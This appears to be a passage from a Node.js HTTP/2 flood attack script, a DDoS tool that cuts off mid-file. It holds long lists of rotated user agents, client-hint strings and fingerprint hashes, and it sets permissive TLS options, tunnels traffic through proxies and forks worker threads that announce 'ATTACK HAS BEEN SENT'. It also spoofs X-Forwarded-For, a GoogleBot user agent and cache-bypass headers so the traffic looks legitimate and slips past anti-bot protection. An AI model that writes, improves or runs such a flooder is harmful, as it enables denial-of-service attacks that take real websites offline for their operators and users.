    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaApp_Android/21.85.1 YaSearchBrowser/21.85.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.3.940 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)',
    'Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 OPR/70.0.3728.178',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.740 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.116 YaApp_Android/22.11.1 YaSearchBrowser/22.11.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 11; RMX3201 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 OPR/78.0.4093.186',
    'Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; HRY-LX1 Build/HONORHRY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.5.121.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/21.11.7.183.10 SA/3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.742 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.113.1 YaSearchBrowser/21.113.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 YaApp_Android/21.80.1 YaSearchBrowser/21.80.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/21.8.3.966.10 SA/3 TA/2.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 8.0.0; BV6800Pro_RU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/19.5.2.38.10 YaApp_iOS/87.00 YaApp_iOS_Browser/87.00 Safari/604.1 SA/3 TA/2.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.727 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaApp_Android/21.82.1 YaSearchBrowser/21.82.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; Lenovo K12 Pro Build/RZCS31.Q2-57-12-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 Instagram 210.0.0.28.71 Android (30/11; 280dpi; 720x1526; lenovo/Lenovo; Lenovo K12 Pro; cebu; qcom; ru_RU; 326153491)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 YaBrowser/21.6.1.274 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.172 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; arm_64; Android 8.0.0; SM-A720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.56.1 YaSearchBrowser/21.56.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.740 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.730 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaBrowser/21.5.3.120.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-N980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 YaBrowser/21.6.6.55.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 9; ZB602KL Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; M2010J19SG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.114.1 YaSearchBrowser/21.114.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.0.1996 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.51.1 YaSearchBrowser/21.51.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MagnitApp_iOS/2.0.9',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.54.1 YaSearchBrowser/21.54.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 YaBrowser/21.6.0.620 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 YaApp_Android/21.80.1 YaSearchBrowser/21.80.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm; Android 10; AQM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 YaBrowser/21.8.1.138.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MagnitApp_iOS/1.4.9',
    'Mozilla/5.0 (Linux; arm; Android 10; AKA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.117.1 YaSearchBrowser/21.117.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaBrowser/21.5.4.119.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 YaBrowser/21.8.1.127.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 YaBrowser/21.6.1.274 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 YaBrowser/21.6.0.616 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0; CHM-U01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36'
        ];

        const version = [
            '"Chromium";v="100", "Google Chrome";v="100"',
            '"(Not(A:Brand";v="8", "Chromium";v="98"',
            '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
            '"Not_A Brand";v="8", "Google Chrome";v="109", "Chromium";v="109"',
            '"Not_A Brand";v="99", "Google Chrome";v="86", "Chromium";v="86"',
            '"Not_A Brand";v="99", "Google Chrome";v="96", "Chromium";v="96"',
            '"Not A;Brand";v="99", "Chromium";v="96", "Microsoft Edge";v="96"',
            '"Mozilla Firefox";v="100", "Gecko";v="100"',
            '"Safari";v="15.0", "AppleWebKit";v="605.1.15", "Version";v="15.0", "Mobile";v="15E148", "Safari";v="15.0", "Macintosh";v="15.0"',
            '"Opera";v="84.0", "Version";v="84.0", "Opera";v="84.0", "AppleWebKit";v="537.36", "Chrome";v="100.0.4896.60"',
            '"Brave";v="1.34.99", "Chrome";v="99.0.1234.567", "Safari";v="15.0.3"',
            '"Edge";v="100.0.1234.567", "EdgeHTML";v="18.0", "Chrome";v="100.0.1234.567", "Safari";v="15.0.3"',
            '"Samsung Internet";v="18.0", "Chrome";v="100.0.1234.567", "Mobile Safari";v="15.0.3"',
            '"Mozilla";v="5.0", "Gecko";v="20100101", "Firefox";v="100.0"',
            '"Konqueror";v="5.0", "KHTML";v="5.0", "Konqueror";v="5.0"',
            '"Midori";v="10.0", "AppleWebKit";v="605.1.15", "Version";v="15.0", "Safari";v="15.0", "X11";v="15.0"'
        ];

        site = [
            'cross-site',
            'same-origin',
            'same-site',
            'none'
          ];
          
          mode = [
            'cors',
            'navigate',
            'no-cors',
            'same-origin'
          ];


          
          dest = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
          ];

    
        
        const platform = [
            "Windows",
            "Windows Phone",
            "Macintosh",
            "Linux",
            "iOS",
            "Android",
            "PlayStation 4",
            "Xbox One",
            "Nintendo Switch",
            "Apple TV",
            "Amazon Fire TV",
            "Roku",
            "Chromecast",
            "Smart TV",
            "Other"
          ];
          
           const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

 const jalist = [
    "002205d0f96c37c5e660b9f041363c1",
    "073eede15b2a5a0302d823ecbd5ad15b",
    "0b61c673ee71fe9ee725bd687c455809",
    "6cd1b944f5885e2cfbe98a840b75eeb8",
    "94c485bca29d5392be53f2b8cf7f4304",
    "b4f4e6164f938870486578536fc1ffce",
    "b8f81673c0e1d29908346f3bab892b9b",
    "baaac9b6bf25ad098115c71c59d29e51",
    "bc6c386f480ee97b9d9e52d472b772d8",
    "da949afd9bd6df820730f8f171584a71",
    "f58966d34ff9488a83797b55c804724d",
    "fd6314b03413399e4f23d1524d206692",
    "0a81538cf247c104edb677bdb8902ed5",
    "0b6592fd91d4843c823b75e49b43838d",
    "0ffee3ba8e615ad22535e7f771690a28",
    "1c15aca4a38bad90f9c40678f6aface9",
    "5163bc7c08f57077bc652ec370459c2f",
    "a88f1426c4603f2a8cd8bb41e875cb75",
    "b03910cc6de801d2fcfa0c3b9f397df4",
    "bfcc1a3891601edb4f137ab7ab25b840",
    "ce694315cbb81ce95e6ae4ae8cbafde6",
    "f15797a734d0b4f171a86fd35c9a5e43"
   ];
   
   const headerGenerator = new HeaderGenerator({
  'browsers': [{
    'name': "firefox",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "opera",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "edge",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': 'chrome',
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "safari",
    'minVersion': 0x10,
    'httpVersion': '2'
  }],
  'devices': ["desktop", "mobile"],
  'operatingSystems': ['windows', "linux", "macos", 'android', 'ios'],
  'locales': ["en-US", 'en']
});

const randomHeaders = headerGenerator.getHeaders();
   
var jar = jalist[Math.floor(Math.random() * jalist.length)];
const platform_versions = ["10.15.7", "11.5.1", "15.0.2", "8.0.0", "6.0"]
const CookieCf = cookie[Math.floor(Math.random() * cookie.length)];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var plat = platform_versions[Math.floor(Math.floor(Math.random() * platform_versions.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var tipe = type[Math.floor(Math.floor(Math.random() * type.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var query = queryStrings[Math.floor(Math.floor(Math.random() * queryStrings.length))];
 var pathx = pathts[Math.floor(Math.floor(Math.random() * pathts.length))];
 var mos = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))];
 var az1 = useragents[Math.floor(Math.floor(Math.random() * useragents.length))];
 var media =  mediaTypes[Math.floor(Math.floor(Math.random() *  mediaTypes.length))];
 var dest1 =  dest[Math.floor(Math.floor(Math.random() *  dest.length))];
 var mode1 =  mode[Math.floor(Math.floor(Math.random() *  mode.length))];
 var pf =  platform[Math.floor(Math.floor(Math.random() *  platform.length))];
 var ver =  version[Math.floor(Math.floor(Math.random() *  version.length))];
 var site1 =  site[Math.floor(Math.floor(Math.random() *  site.length))];

 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 
      if (cluster.isMaster) {
        for (let counter = 1; counter <= args.threads; counter++) {
          cluster.fork();
          console.clear()
          console.log(gradient.vice(`[!] ATTACK HAS BEEN SENT.`));
        }
      } else {
        setInterval(runFlooder);
      };
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     //connection.setTimeout(options.timeout * 600000);
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }


 const Socker = new NetSocket();
 headers[":method"] = randomMethod;
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + pathx + randstr(10) + query + randstr(10) + ":443"; 
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["accept-language"] = lang;
  headers["accept-encoding"] = encoding;
 headers["accept"] = accept;
  headers["X-Forwarded-For"] = spoofed;
 headers["X-Forwarded-Host"] = spoofed;
 headers["Real-IP"] = spoofed;
 headers["cache-control"] = control;
   headers["sec-ch-ua"] = ver;
  headers["sec-ch-ua-mobile"] = "?0", "?1";
 headers["cf-cache-status"] = "BYPASS", "HIT", "DYNAMIC";
 headers["sec-ch-ua-platform"] = pf;
 headers["sec-ch-ua-platform-version"] = randomHeaders["sec-ch-ua-platform-version"];
 headers["origin"] = "https://" + parsedTarget.host + ":443";
 headers["referer"] = Ref;
 headers["upgrade-insecure-requests"] = "1";
 headers["user-agent"] = uap1 + mos + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
 headers["sec-fetch-dest"] = dest1;
  headers["sec-fetch-mode"] = mode1;
  headers["sec-fetch-site"] = site1;
 headers["TE"] = "trailers";
 headers["Trailer"] = "Max-Forwards";
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["content-type"] = tipe;
 headers["pragma"] = control;
 headers["media-type"] = media;
  headers["set-cookie"] = randomHeaders["set-cookie"] + CookieCf;
headers["origin"] = "https://" + parsedTarget.host + ":443"; // Include port 80 in origin header
headers["Via"] = "2" + parsedTarget.host + spoofed2 + ":443"; // Include port 80 in Via header
headers["cookie"] = randomHeaders["cookie"];
headers["Alt-Svc"] = randomHeaders["Alt-Svc"];
